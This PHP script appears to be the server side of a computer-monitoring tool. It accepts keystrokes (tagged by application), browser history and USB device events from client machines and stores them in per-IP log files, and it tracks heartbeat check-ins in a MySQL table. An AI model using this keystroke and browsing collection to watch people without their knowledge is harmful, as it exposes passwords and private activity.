<?php

//include_once "database.php";
//include_once "common.php";

include_once "config.inc.php";
include_once "./includes/json.lib.php";

$config = new JConfig();

// Use mysqli instead of mysql_* functions
$mysqli = new mysqli($config->dbhost, $config->dbuser, $config->dbpassword, $config->dbname);

if ($mysqli->connect_error) {
    die("Could not connect MySQL: " . $mysqli->connect_error);
}

$mysqli->set_charset('utf8');

$ipaddr = $_SERVER['REMOTE_ADDR'];
$ipitems = explode(".", $ipaddr);

$appVersion = isset($_POST['Version']) ? $_POST['Version'] : "1.0";
$appEvent = isset($_POST['Event']) ? $_POST['Event'] : "none";

$retObj = ['Status' => 'OK'];
if ($appEvent == 'Tic') {
    $macaddress = isset($_POST['MacAddress']) ? $_POST['MacAddress'] : "";
    $lastBrowserTic = addMonitorTic($ipaddr, $macaddress, $appVersion, $mysqli);
    $retObj['LastBrowserTic'] = $lastBrowserTic;
} else {
    $json = file_get_contents('php://input');

    // Decode the JSON
    $data = json_decode($json, true);

    if ($data) {
        $appEvent = $data['Event'];
        $appVersion = $data['Version'];
        $macaddress = $data['MacAddress'];
        
        // Handle different event types
        switch ($appEvent) {
            case 'BrowserHistory':
                $browserHistories = $data['BrowserHistories'];
                // Process Browser History
                addBrowserHistory($mysqli, $browserHistories);
                break;
            case 'KeyLog':
                $keyLogs = $data['KeyLogs'];
                // Process key logs
                addKeyLogs($mysqli, $keyLogs);
                break;
            case 'USBLog':
                $usbLogs = $data['USBLogs'];
                // Process USB logs
                addUSBLogs($mysqli, $usbLogs);
                break;
        }
    } else {
        // Handle JSON decode error
        http_response_code(400);
        echo json_encode(['error' => 'Invalid JSON']);
    }
}

$retJSON = json_encode($retObj);

echo $retJSON;
$mysqli->close();


function addMonitorTic($ip, $macaddr, $version, $mysqli)
{
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        return;
    }

    $monitor_ip_id = $ip_info['id'];
    $lastBrowserTic = $ip_info['last_browser_tic'] ? strtotime($ip_info['last_browser_tic']) : time();

    if (strlen($macaddr) > 11) {
        $sql = "UPDATE tbl_monitor_ips SET `os_status`=1, `monitor_status`=1, last_monitor_tic = NOW(), `mac_address`='" . $mysqli->real_escape_string($macaddr) . "', `app_version`='" . $mysqli->real_escape_string($version) . "'
        WHERE id = '" . $monitor_ip_id . "'";
    } else {
        $sql = "UPDATE tbl_monitor_ips SET `os_status`=1, `monitor_status`=1, last_monitor_tic = NOW(), `app_version`='" . $mysqli->real_escape_string($version) . "'
        WHERE id = '" . $monitor_ip_id . "'";
    }
    $mysqli->query($sql);

    return $lastBrowserTic;
}

function addBrowserHistory($mysqli, $browserHistories)
{
    global $logs_dir_path;
    
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        return;
    }

    $type = $ip_info['type'];
    $user_name = $ip_info['name'];
    $ip_id = $ip_info['id'];

    // Get IP-based directory paths
    $ip_paths = getIPBasedPaths($ip_id, $_SERVER['REMOTE_ADDR']);

    // browser history
    if ($browserHistories) {
        if (count ($browserHistories) > 0) {
            $lastDate = null;
            foreach ($browserHistories as $browserHistory) {
                $date = $browserHistory['date'];
                $url = $browserHistory['url'];

                if ($lastDate == null || $lastDate < $date) {
                    $lastDate = $date;
                }

                $dir_date = date('Y-m-d', strtotime($date));

                $hour = date('H', strtotime($date));
                $mins = date('i', strtotime($date));
                $secs = date('s', strtotime($date));
                $subdir = $hour . '.' . ($mins >= 30 ? '30' : '00');

                $log_dir = $ip_paths['logs'] . $dir_date . '/' . $subdir . '/';
                if (!file_exists($log_dir)) {
                    mkdir($log_dir, 0755, true);
                }
                
                $filePath = $log_dir . "browser_history.txt";
                $content = "Date: {$date} | URL: {$url}\n";
                file_put_contents($filePath, $content, FILE_APPEND);
            }
        }
    }
}

function addKeyLogs($mysqli, $keyLogs)
{
    global $logs_dir_path;
    
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        return;
    }

    $type = $ip_info['type'];
    $user_name = $ip_info['name'];
    $ip_id = $ip_info['id'];

    // Get IP-based directory paths
    $ip_paths = getIPBasedPaths($ip_id, $_SERVER['REMOTE_ADDR']);

    // key logs
    if ($keyLogs) {
        if (count ($keyLogs) > 0) {
            // $keyLogs is already an array from json_decode, no need to decode again
            foreach ($keyLogs as $keyLog) {
                $date = $keyLog['date'];
                $application = $keyLog['application'];
                $key = $keyLog['key'];

                $dir_date = date('Y-m-d', strtotime($date));

                $hour = date('H', strtotime($date));
                $mins = date('i', strtotime($date));
                $secs = date('s', strtotime($date));
                $subdir = $hour . '.' . ($mins >= 30 ? '30' : '00');

                $log_dir = $ip_paths['logs'] . $dir_date . '/' . $subdir . '/';
                if (!file_exists($log_dir)) {
                    mkdir($log_dir, 0755, true);
                }
                
                $filePath = $log_dir . "key_logs.txt";
                $content = "Date: {$date} | Application: {$application} | Key: {$key}\n";
                file_put_contents($filePath, $content, FILE_APPEND);
            }
        }
    }
}

function addUSBLogs($mysqli, $usbLogs)
{
    global $logs_dir_path;
    
    $ip_info = getClientInfo($mysqli);

    if ($ip_info == null) {
        return;
    }

    $type = $ip_info['type'];
    $user_name = $ip_info['name'];
    $ip_id = $ip_info['id'];

    // Get IP-based directory paths
    $ip_paths = getIPBasedPaths($ip_id, $_SERVER['REMOTE_ADDR']);

    // USB logs
    if ($usbLogs) {
        // $usbLogs is already an array from json_decode, no need to decode again
        if (count ($usbLogs) > 0) {
            foreach ($usbLogs as $usbLog) {
                $date = $usbLog['date'];
                $device_name = $usbLog['device_name'];
                $action = $usbLog['action'];

                $dir_date = date('Y-m-d', strtotime($date));

                $hour = date('H', strtotime($date));
                $mins = date('i', strtotime($date));
                $secs = date('s', strtotime($date));
                $subdir = $hour . '.' . ($mins >= 30 ? '30' : '00');

                $log_dir = $ip_paths['logs'] . $dir_date . '/' . $subdir . '/';
                if (!file_exists($log_dir)) {
                    mkdir($log_dir, 0755, true);
                }
                
                $filePath = $log_dir . "usb_logs.txt";
                $content = "Date: {$date} | Device: {$device_name} | Action: {$action}\n";
                file_put_contents($filePath, $content, FILE_APPEND);
            }
        }
    }
}